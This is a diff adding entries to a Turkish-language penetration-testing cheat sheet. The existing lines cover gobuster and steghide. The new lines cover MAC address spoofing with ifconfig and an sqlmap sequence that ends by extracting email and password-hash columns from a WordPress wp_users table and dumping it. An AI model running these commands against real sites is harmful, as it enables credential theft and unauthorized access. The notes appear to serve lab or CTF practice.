@@ -75,10 +75,26 @@ gobuster dir -u < URL > -w < Wordlist > -x php,txt,html,bak,old,tar,gz,tgz,zip,7
 gobuster dir -U < User > -P < Şifre > -u < URL > -w < Wordlist > ---> Id ve Şifre verilmesi gereken yer için.
  
 # StegHide Kullanımı #
- 
-steghide info < Img ismi > ---> Resimde saklı herhangi bir dosya var mı ?
+ steghide info < Img ismi > ---> Resimde saklı herhangi bir dosya var mı ?
 
 steghide extract -sf < Img ismi > ---> Resimde saklı dosya varsa çıkart.
 
+# Mac Changer #
+ifconfig eth0 down ---> ETH0 bağlantısını keser.
+
+ifconfig eth0 hw ether 00:11:22:33:44:55 ---> İstediğin MAC adresini atar.
+
+ifconfig eth0 up ---> ETH0 bağlantısını kurar.
+ 
+# SQL Map #
+sqlmap -r request --dbs --batch
+
+sqlmap -r request --dbs --batch -D wordpress --tables
+
+sqlmap -r request --dbs --batch -D wordpress -T wp_users --columns
+
+sqlmap -r request --dbs --batch -D wordpress -T wp_users -C user_email,user_pass --sql-query "Select user_email,user_pass from wp_users"
+
+sqlmap -r request --dump -D wordpress -T wp_users
  
 
